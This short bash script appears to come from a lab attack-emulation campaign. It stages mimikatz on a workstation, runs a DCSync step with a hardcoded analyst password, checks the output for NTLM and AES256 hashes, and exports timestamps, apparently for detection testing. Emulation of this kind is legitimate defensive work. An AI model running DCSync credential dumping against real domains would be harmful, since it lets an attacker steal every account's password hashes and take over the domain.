#!/usr/bin/env bash
# T009 — DCSync from ws01 via mimikatz (chief_command from T031 spray — cadre.local)
set -euo pipefail
source "$(dirname "$0")/../lib/campaign-a-common.sh"

CASE_ID="CADRE-T009-DCSYNC-${CASE_DATE:-$(date -u +%Y%m%d)}-ws01"
T0=$(date -u +%Y-%m-%dT%H:%M:%SZ)
echo "=== T009 | ${CASE_ID} | T0=${T0} ==="

ws01_ensure_mimikatz
OUT="$(campaign_stage_run_ps1 analyst_t1 'T13r_An@lyst!' campaign-a-t009-dcsync.ps1)"
printf '%s\n' "${OUT}"
campaign_require_ok T009 "${OUT}" 'T009_OK|aes256_hmac|Hash NTLM'

cadre_export "${CASE_ID}" T009 "${T0}" 192.168.77.62
echo "T0=${T0}" | tee "/tmp/${CASE_ID}.t0"
